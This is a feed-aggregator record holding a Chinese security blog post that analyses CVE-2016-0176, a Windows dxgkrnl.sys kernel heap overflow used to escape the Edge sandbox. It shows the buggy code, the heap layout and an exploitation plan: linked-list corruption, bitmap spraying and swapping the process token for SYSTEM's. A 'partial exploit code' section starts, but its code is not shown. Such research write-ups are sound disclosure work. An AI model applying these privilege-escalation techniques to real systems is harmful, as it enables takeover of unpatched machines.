{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-10-19 01:46:12","updatedTime":"2020-10-19 01:46:12","title":"A Link to System Privilege","link":"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/","description":"<h2 id=\"CVE-2016-0176漏洞及利用详解\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#CVE-2016-0176漏洞及利用详解\" class=\"headerlink\" title=\"CVE-2016-0176漏洞及利用详解\"></a>CVE-2016-0176漏洞及利用详解</h2> \n<h3 id=\"如何攻破微软的Edge浏览器\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#如何攻破微软的Edge浏览器\" class=\"headerlink\" title=\"如何攻破微软的Edge浏览器\"></a>如何攻破微软的Edge浏览器</h3> \n<p>攻破微软的Edge浏览器至少需要包含两方面基本要素：浏览器层面的远程代码执行(RCE: Remote Code Execution)和浏览器沙箱绕过。 浏览器层面的远程代码执行通常通过利用Javascript脚本的漏洞完成，而浏览器的沙箱绕过则可以有多种方式，比如用户态的逻辑漏洞，以及通过内核漏洞达到本地提权(EoP: Escalation of Privilege)。</p> \n<p>微软Edge浏览器使用的沙箱是建立在Windows操作系统的权限检查机制之上的。在Windows操作系统中，资源是可以在全系统范围内被共享的，比如一个文件或者设备可以在不同进程间被共享。由于有些资源里面包含着敏感信息，而另外一些资源的完整性则关乎系统的正常运转，如果被破坏了就会导致整个系统的崩溃。因此当一个进程在访问资源时需要进行严格的权限检查。当一个资源被打开时，主调进程的令牌信息会与目标资源的安全描述符信息进行匹配检查。权限检查由几个不同层面的子检查组成：属主身份及组身份检查，特权检查，完整性级别及可信级别检查，Capability检查等等。上一代的沙箱是基于完整性级别机制的，在沙箱里面运行的应用程序处于Low完整性级别，因此无法访问处于Medium或者更高级别的资源。微软的Edge浏览器采用的是最新一代的沙箱机制，这代沙箱是基于AppContainer的，运行在沙箱里的应用程序依然处于Low完整性级别，当它们尝试访问资源时，除了进行完整性级别检查，还需要进行Capabilities的检查，这种检查更加细腻以及个性化。关于权限检查机制的更多细节，可以参考我在ZeroNights 2015上的演讲：<a href=\"https://github.com/long123king/tokenext/blob/master/doc/Did_You_Get_Your_Token.pdf\" target=\"_blank\" rel=\"external\">Did You Get Your Token?</a><br><a id=\"more\"></a><br>沙箱绕过的最常用的方法是通过内核态的漏洞利用，直接操作内核对象(DKOM: Direct Kernel Object Manipulation)以达到本地提权。</br></br></p> \n<h3 id=\"CVE-2016-0176\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#CVE-2016-0176\" class=\"headerlink\" title=\"CVE-2016-0176\"></a>CVE-2016-0176</h3> \n<p>这个漏洞是位于dxgkrnl.sys驱动中，是一个内核堆溢出漏洞。</p> \n<p>被篡改的数据结构定义如下：<br> \n  <figure class=\"highlight c\"> \n   <table> \n    <tr> \n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n     <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> _D3DKMT_PRESENTHISTORYTOKEN</span><br><span class=\"line\">{</span><br><span class=\"line\">    D3DKMT_PRESENT_MODEL  Model; <span class=\"comment\">//D3DKMT_PM_REDIRECTED_FLIP      = 2,</span></span><br><span class=\"line\">    UINT                  TokenSize; <span class=\"comment\">// 0x438</span></span><br><span class=\"line\">    UINT64                CompositionBindingId;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"keyword\">union</span></span><br><span class=\"line\"> {</span><br><span class=\"line\"> D3DKMT_FLIPMODEL_PRESENTHISTORYTOKEN Flip;</span><br><span class=\"line\"> D3DKMT_BLTMODEL_PRESENTHISTORYTOKEN Blt;</span><br><span class=\"line\"> D3DKMT_VISTABLTMODEL_PRESENTHISTORYTOKEN VistaBlt;</span><br><span class=\"line\"> D3DKMT_GDIMODEL_PRESENTHISTORYTOKEN Gdi;</span><br><span class=\"line\"> D3DKMT_FENCE_PRESENTHISTORYTOKEN Fence;</span><br><span class=\"line\"> D3DKMT_GDIMODEL_SYSMEM_PRESENTHISTORYTOKEN GdiSysMem;</span><br><span class=\"line\"> D3DKMT_COMPOSITION_PRESENTHISTORYTOKEN Composition;</span><br><span class=\"line\"> }</span><br><span class=\"line\"> Token;</span><br><span class=\"line\">} D3DKMT_PRESENTHISTORYTOKEN;</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n    </tr> \n   </table> \n  </figure></br></p> \n<p>我们把这个数据结构简称为”history token”，想要激发这个漏洞需要将关键成员变量按如下定义： </p> \n<ul> \n <li><strong>Model</strong>要设置为<strong>D3DKMT_PM_REDIRECTED_FLIP</strong>;</li> \n <li><strong>TokenSize</strong>要设置为<strong>0x438</strong>; </li> \n</ul> \n<p>你大概已经猜到漏洞是存在在<strong>Token.Flip</strong>成员里面，该成员类型定义如下：<br> \n  <figure class=\"highlight c\"> \n   <table> \n    <tr> \n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br /></br></br></br></br></br></br></br></br></br></br></pre></td> \n     <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> _D3DKMT_FLIPMODEL_PRESENTHISTORYTOKEN</span><br><span class=\"line\">{</span><br><span class=\"line\">    UINT64                                     FenceValue;</span><br><span class=\"line\">    ULONG64                                    hLogicalSurface;</span><br><span class=\"line\">    UINT_PTR                                   dxgContext;</span><br><span class=\"line\"> D3DDDI_VIDEO_PRESENT_SOURCE_ID VidPnSourceId;</span><br><span class=\"line\"></span><br><span class=\"line\"> ……</span><br><span class=\"line\"> </span><br><span class=\"line\"> D3DKMT_DIRTYREGIONS DirtyRegions;</span><br><span class=\"line\">} D3DKMT_FLIPMODEL_PRESENTHISTORYTOKEN;</span><br /></br></br></br></br></br></br></br></br></br></br></pre></td> \n    </tr> \n   </table> \n  </figure></br></p> \n<p>继续深入到<strong>DirtyRegions</strong>的类型定义：<br> \n  <figure class=\"highlight c\"> \n   <table> \n    <tr> \n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n     <td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> tagRECT</span><br><span class=\"line\">{</span><br><span class=\"line\">    LONG    left;</span><br><span class=\"line\">    LONG    top;</span><br><span class=\"line\">    LONG    right;</span><br><span class=\"line\"> LONG bottom;</span><br><span class=\"line\">} RECT, *PRECT, NEAR *NPRECT, FAR *LPRECT; <span class=\"comment\">// 0x10 bytes</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"keyword\">struct</span> _D3DKMT_DIRTYREGIONS</span><br><span class=\"line\">{</span><br><span class=\"line\"> UINT NumRects;</span><br><span class=\"line\"></span><br><span class=\"line\"> RECT Rects[D3DKMT_MAX_PRESENT_HISTORY_RECTS]; <span class=\"comment\">// 0x10 * 0x10 = 0x100 bytes</span></span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"comment\">//#define D3DKMT_MAX_PRESENT_HISTORY_RECTS 16</span></span><br><span class=\"line\"></span><br><span class=\"line\">} D3DKMT_DIRTYREGIONS;</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n    </tr> \n   </table> \n  </figure></br></p> \n<p>现在我们已经到达了最基本类型的定义, 看到一个成员是DWORD类型的<strong>NumRects</strong>, 另外一个是数组<strong>RECT</strong>，其中每个元素的类型是<strong>Rects</strong>, 这个数组是定长的，有16个元素的空间，每个元素0x10字节，每个这个数组的总长度是0x100字节。</p> \n<p><img src=\"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_1.svg\" alt=\"Layout of Abused structures\" /></p> \n<p>上图展示了被篡改的数据结构的布局以及它们之间的关系，左面一栏是我们在调用Win32 API函数<strong>D3DKMTPresent</strong>时从用户态传入的数据结构，中间一栏是dxgkrnl.sys驱动接收到并维护的对应的数据结构，它是从左面一栏的数据结构中拷贝出来的，而右面一栏是内嵌定义在history token中的成员<strong>Token.Flip</strong>的数据结构。我们知道一个union的大小是由其成员中最大的成员大小决定的，而在这里<strong>Token.Flip</strong>恰好是union<strong>Token</strong>中最大的一个成员，也就是说整个history token数据结构是由<strong>Token.Flip</strong>中的内容填满直到结尾，这个特征非常重要，大大简化了利用的复杂度。</p> \n<p>有了上面关于数据结构的知识，我们就可以很方便地理解这个漏洞了，现在展示的是引起漏洞的汇编代码片断：</p> \n<pre><code>loc_1C009832A: DXGCONTEXT::SubmitPresentHistoryToken(......) + 0x67B\n        cmp     dword ptr[r15 + 334h], 10h // NumRects\n        jbe     short loc_1C009834B; Jump if Below or Equal(CF = 1 | ZF = 1)\n        call    cs : __imp_WdLogNewEntry5_WdAssertion\n        mov     rcx, rax\n        mov     qword ptr[rax + 18h], 38h\n        call    cs : __imp_WdLogEvent5_WdAssertion\n\nloc_1C009834B: DXGCONTEXT::SubmitPresentHistoryToken (......) + 0x6B2\n        mov     eax, [r15 + 334h]\n        shl     eax, 4\n        add     eax, 338h\n        jmp     short loc_1C00983BD\n\nloc_1C00983BD: DXGCONTEXT::SubmitPresentHistoryToken (......) + 0x6A5\n        lea     r8d, [rax + 7]\n        mov     rdx, r15; Src\n        mov     eax, 0FFFFFFF8h;\n        mov     rcx, rsi; Dst\n        and     r8, rax; Size\n        call    memmove\n</code></pre> \n<p>在这片代码的入口处，r15寄存器指向的是history token结构的内存区域。代码首先从内存区域的0x334偏移处取出一个DWORD，并与0x10进行比较，通过上图我们可以看到取出的DWORD正是<strong>Token.Flip.NumRects</strong>成员，而0x10则是内嵌数组<strong>Token.Flip.Rects</strong>容量，所以这里比较的是<strong>Token.Flip.NumRects</strong>的值是否超出了<strong>Token.Flip.Rects</strong>数组的容量。如果你是在代码审查时遇到了这段代码，那么你可能会自言自语道大事不妙，微软已经意识到了这个潜在的溢出，并做了比较严格的检查。硬着头皮往下看，当溢出发生时，代码会以assertion的方式将这个异常情况记录到watch dog驱动，但是这个比对后的产生的两个代码分枝最终又都在loc_1C009834B处会合。可能你会想watch dog驱动有机会对代码溢出情况做出反应，通过bug check主动蓝屏(BSOD)，然而事实上什么都没有发生。 不管你对<strong>Token.Flip.NumRects</strong>这个变量设置什么值，代码都会最终执行到loc_1C009834B处的代码块，这个代码块对<strong>Token.Flip.NumRects</strong>值做了一些基础的算术运算，并且用运算的结果指定memcpy操作拷贝的长度。</p> \n<p>为了更加直观地说明问题，把汇编代码改写成对应的C++代码：<br> \n  <figure class=\"highlight c\"> \n   <table> \n    <tr> \n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br /></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n     <td class=\"code\"><pre><span class=\"line\">D3DKMT_PRESENTHISTORYTOKEN* hist_token_src = BufferPassedFromUserMode(…);</span><br><span class=\"line\">D3DKMT_PRESENTHISTORYTOKEN* hist_token_dst = ExpInterlockedPopEntrySList(…);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(hist_token_src-&gt;dirty_regions.NumRects &gt; <span class=\"number\">0x10</span>)</span><br><span class=\"line\">{</span><br><span class=\"line\"> <span class=\"comment\">// log via watch dog assertion, NOT work in free/release build</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">auto</span> size = (hist_token_src-&gt;dirty_regions.NumRects * <span class=\"number\">0x10</span> + <span class=\"number\">0x338</span> + <span class=\"number\">7</span>) / <span class=\"number\">8</span>;</span><br><span class=\"line\"><span class=\"keyword\">auto</span> src = (<span class=\"keyword\">uint8_t</span>*)hist_token_src;</span><br><span class=\"line\"><span class=\"keyword\">auto</span> dst = (<span class=\"keyword\">uint8_t</span>*)hist_token_dst;</span><br><span class=\"line\"><span class=\"built_in\">memcpy</span>(dst, src, size);</span><br><span class=\"line\"> </span><br /></br></br></br></br></br></br></br></br></br></br></br></br></pre></td> \n    </tr> \n   </table> \n  </figure></br></p> \n<p> 事情更加简单明了，无论我们给<strong>Token.Flip.NumRects</strong>指定什么样的值，一个内存拷贝操作在所难免，拷贝操作的源数据正是我们通过调用Win32 API <strong>D3DKMTPresent</strong>从用户态传入的buffer，拷贝操作的目标是通过调用<strong>ExpInterlockedPopEntrySList</strong>从内核堆上分配的buffer，而拷贝操作的长度是通过计算拥有<strong>Token.Flip.NumRects</strong>个元素的数组的长度，再加上数组成员在history token结构体中的偏移，以及因为对齐产生的padding长度。如果我们为<strong>Token.Flip.NumRects</strong>指定了一个大于0x10的长度，那么内核堆溢出就发生了，我们可以控制溢出的长度，以及溢出的前0x38字节内容(如上面介绍数据结构布局的图所示，在从用户态传入的数据中，我们可以控制history token结构后面的0x38字节数据)。</p> \n<p> 这个漏洞非常有意思，因为微软已经预见了它的存在却没能阻止它的发生，我们可以从中得到的教训是不要滥用编程技巧，除非你知道你自己在干什么，比如assertion机制。</p> \n<h3 id=\"利用\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h3> \n<p> 对于一个堆利用来说，了解目标内存区域附近的内存布局至关重要，我们已经知道目标内存是通过<strong>ExpInterlockedPopEntrySList</strong>函数在内核态内存池中分配的。</p> \n<p> 通过简单调试，我们可以得到如下内存池信息：</p> \n<pre><code>kd&gt; u rip-6 L2\ndxgkrnl!DXGCONTEXT::SubmitPresentHistoryToken+0x47b:\nfffff801`cedb80fb call    qword ptr [dxgkrnl!_imp_ExpInterlockedPopEntrySList (fffff801`ced77338)]\nfffff801`cedb8101 test    rax,rax\nkd&gt; !pool rax\nPool page ffffc0012764c5a0 region is Paged pool\n*ffffc0012764b000 : large page allocation, tag is DxgK, size is 0x2290 bytes\n    Pooltag DxgK : Vista display driver support, Binary : dxgkrnl.sys\n</code></pre> \n<p>这是一个比较大的内存区域，大小为0x2290字节，因为这个大小已经超过了一个内存页的长度(一个内存页是0x1000字节)，所以它是以大页内存(Large Page Allocation)分配的，三个连续内存页被用来响应这次大页内存分配申请，为了节约内存，在0x2290之后的多余空间被回收并且链接到了Paged Pool的free list上面，供后续的小内存分配使用。在0x2290之后，会插入一个起到分隔作用的标记为Frag的内存分配。关于内核内存池及大页分配的详情，参考Tarjei Mandt的白皮书：<a href=\"https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf\" target=\"_blank\" rel=\"external\">Kernel Pool Exploitation on Windows 7</a>。下面展示的是在0x2290偏移附近的内存内容：</p> \n<pre><code>kd&gt; db ffffc0012764b000+0x2290 L40\nffffc001`2764d290  00 01 02 03 46 72 61 67-00 00 00 00 00 00 00 00  ....Frag........\nffffc001`2764d2a0  90 22 00 00 00 00 00 00-00 00 00 00 00 00 00 00  .\"..............\nffffc001`2764d2b0  02 01 01 00 46 72 65 65-0b 43 44 9e f1 81 a8 47  ....Free.CD....G\nffffc001`2764d2c0  01 01 04 03 4e 74 46 73-c0 32 42 3a 00 e0 ff ff  ....NtFs.2B:....\n</code></pre> \n<p>驱动dxgkrnl.sys中的<strong>DXGPRESENTHISTORYTOKENQUEUE::GrowPresentHistoryBuffer</strong>函数用来分配并管理一个链接history token的单链表。每个history token的长度是0x438字节，加上内存池分配的头部及padding一共0x450字节，所以0x2290大小的内存被平均分成8个history token，并且以倒序的方式链接在单链表中。驱动dxgkrnl.sys意图将单链表以look-aside list的方式来响应单个history token的内存分配请求。</p> \n<p>单链表初始状态时如下所示：</p> \n<p><img src=\"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_2.svg\" alt=\"Singly-Linked List of History Tokens\" /></p> \n<p>单链表在响应过一个history token分配请求后如下所示：</p> \n<p><img src=\"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_3.svg\" alt=\"Singly-Linked List After 1 Pop\" /></p> \n<p>单链表在响应过两个history token分配请求后如下所示：</p> \n<p><img src=\"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_4.svg\" alt=\"Singly-Linked List After 2 Pop\" /></p> \n<p>明确了溢出的目标内存处的内存布局，我们得到两种溢出方案：</p> \n<h4 id=\"方案1：溢出0x2290偏移后面的复用的小内存分配空间\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#方案1：溢出0x2290偏移后面的复用的小内存分配空间\" class=\"headerlink\" title=\"方案1：溢出0x2290偏移后面的复用的小内存分配空间:\"></a>方案1：溢出0x2290偏移后面的复用的小内存分配空间:</h4> \n<p><img src=\"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_5.svg\" alt=\"Overflow Scenario 1\" /></p> \n<h4 id=\"方案2：溢出相邻的单链表头部，转化成单链表利用\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#方案2：溢出相邻的单链表头部，转化成单链表利用\" class=\"headerlink\" title=\"方案2：溢出相邻的单链表头部，转化成单链表利用:\"></a>方案2：溢出相邻的单链表头部，转化成单链表利用:</h4> \n<p><img src=\"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_6.svg\" alt=\"Overflow Scenario 2\" /></p> \n<p>方案1有诸多限制，因为我们只能控制溢出的前0x38字节内容，这意味着减掉padding空间，用于分隔的frag内存池分配项目的长度以及接下来的内存池分配的头部，我们没有多余发挥的空间。</p> \n<p>方案2看起来很可行，虽然我们知道Windows内核现在已经强制对双链表进行完整性检查，但是对于单链表没有任何检查，因此我们可以通过覆盖单链表中的next指针达到重定向读写的目标。</p> \n<p>为了进一步验证可行性，我们先在头脑里演绎一下方案2的种种可能。上面的几张图已经展示了从单链表中弹出两个history token的情形，此时我们可以溢出节点B，让它覆盖节点A的头部，然后我们将节点B压回单链表：</p> \n<p><img src=\"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_7.svg\" alt=\"Overwriting Node A's header\" /></p> \n<p>当我们把节点A也压回单链表时，接下来会怎样，会不会如我们所料将单链表的读写重定向到被溢出覆盖的next指针处</p> \n<p><img src=\"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_9.svg\" alt=\"Redirect Impossible\" /></p> \n<p>很遗憾并非如我们所料，这种重定向读写不会发生，因为当我们将节点A压回单链表时，覆盖的QWORD会恢复成指向节点B的指针： </p> \n<p><img src=\"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_10.svg\" alt=\"Back to Initial State\" /></p> \n<p>我们回到已经弹出两个节点的状态再尝试另外一种可能：</p> \n<p><img src=\"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_11.svg\" alt=\"After Poping 2 Nodes\" /></p> \n<p>这次我们先将节点A压回单链表:</p> \n<p><img src=\"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_12.svg\" alt=\"First Push Node A Back\" /></p> \n<p>然后我们溢出节点B，以覆盖节点A的头部，因为此时节点A已经被回收进单链表，所以不会再有任何操作可以将子节点A的头部恢复了。现在单链表已经被破坏了，它的第二个元素已经指向了溢出覆盖的QWORD所指向的内存处。:</p> \n<p><img src=\"http://keenlab.tencent.com/zh/img/A-Link-To-System-Privilege/edge_eop_img_13.svg\" alt=\"Overflow Scenario 3\" /></p> \n<p>经过了上面的演绎，我们对方案2信心十足，现在我们就开始动手吧！看起来我们必须对单链表乱序调用push和pop，至少要有两次连续的pop，我做了如下的尝试：</p> \n<h4 id=\"尝试1：循环调用D3DKMTPresent并传入可导致溢出的buffer。\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#尝试1：循环调用D3DKMTPresent并传入可导致溢出的buffer。\" class=\"headerlink\" title=\"尝试1：循环调用D3DKMTPresent并传入可导致溢出的buffer。\"></a>尝试1：循环调用D3DKMTPresent并传入可导致溢出的buffer。</h4> \n<p>结果失败了，经过调试发现每次都在重复pop节点A，使用后push节点A这个循环，根本不会产生乱序。原因很简单，循环调用D3DKMTPresent被逐个响应，所以我们必须同时调用它才能产生乱序。</p> \n<h4 id=\"尝试2：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer。\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#尝试2：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer。\" class=\"headerlink\" title=\"尝试2：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer。\"></a>尝试2：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer。</h4> \n<p>结果又失败了，经过一些简单的逆向分析，D3DKMTPresent的调用路径应该是被加锁保护了。</p> \n<p>经历了两次挫败，不免开始怀疑人生，是否会出现两次连续的pop呢？然后很快就意识到绝对可行，肯定是我姿势不对，否则这相对复杂的单链表就退化成单个变量了，肯定有其他的内核调用路径可以激发单链表pop操作。我编写了一个windbg脚本记录每次push和pop操作，然后尝试打开一些图形操作密集的应用程序，只要发现了两次连续的pop就证明发现了第二条路径。经过简单的尝试，奇迹出现了，当我打开Solitaire游戏时，两次pop出现了，经过简单的调试，发现<strong>BitBlt</strong> API会触发第二条pop的内核路径。</p> \n<h4 id=\"尝试3：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer，同时在另外一批多线程中循环调用BitBlt。\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#尝试3：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer，同时在另外一批多线程中循环调用BitBlt。\" class=\"headerlink\" title=\"尝试3：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer，同时在另外一批多线程中循环调用BitBlt。\"></a>尝试3：在多线程中循环调用D3DKMTPresent并传入可导致溢出的buffer，同时在另外一批多线程中循环调用BitBlt。</h4> \n<p>这一次终于成功地将单链表中的next指针重定向到指定位置，达到了内核态任意地址写的目的。但是这种写的能力有限，很难重复，而我们想要通过DKOM方式偷换令牌需要多次内核读写，而这种矛盾在Pwn2Own 2016的3次尝试总时间15分钟的严苛比赛规则下显得更加突出，我们需要一些其他技巧。</p> \n<h3 id=\"其他技巧\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#其他技巧\" class=\"headerlink\" title=\"其他技巧\"></a>其他技巧</h3> \n<h4 id=\"如何达到可重复的内核态任意地址读写\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#如何达到可重复的内核态任意地址读写\" class=\"headerlink\" title=\"如何达到可重复的内核态任意地址读写\"></a>如何达到可重复的内核态任意地址读写</h4> \n<p>为了达到这个目标，我使用win32k的位图bitmap对象作为中间目标。首先向内核态内存中spray大量的bitmap对象，然后猜测它们的位置，并试图通过上面的重定向写技巧修改它们的头部，当我成功地命中第一个bitmap对象后，通过修改它的头部中的buffer指针和长度，让其指向第二个bitmap对象。因此总共需要控制两个bitmap对象，第一个用来控制读写的地址，而第二个用来控制读写的内容。</p> \n<p>再详细地讲，我一共向内核内存中spray了4GB的bitmap对象，首先通过喷射大尺寸的256MB的bitmap对象来锁定空间以及引导内存对齐，然后将它们逐个替换成1MB的小尺寸bitmap对象，这些对象肯定位于0x100000的边界处，就使得猜测它们的地址更加简单。</p> \n<p>在猜测bitmap对象地址的过程中需要信息泄露来加快猜测速度，这是通过<strong>user32! gSharedInfo</strong>完成的。</p> \n<h4 id=\"偷换令牌\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#偷换令牌\" class=\"headerlink\" title=\"偷换令牌\"></a>偷换令牌</h4> \n<p>有了可重复地任意地址读写的能力后，再加上通过sidt泄露内核模块的地址，我们可以方便地定位到<strong>nt!PspCidTable</strong>指向的句柄表，然后从中找出当前进程以及system进程对应的_EPROCESS结构体，进而找到各自的_TOKEN结构的地址，从而完成替换。</p> \n<h3 id=\"部分利用代码\"><a href=\"http://keenlab.tencent.com/2016/11/18/A-Link-to-System-Privilege/#部分利用代码\" class=\"headerlink\" title=\"部分利用代码\"></a>部分利用代码</h3> \n<figure class=\"highlight c\"> \n <table> \n  <tr> \n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span 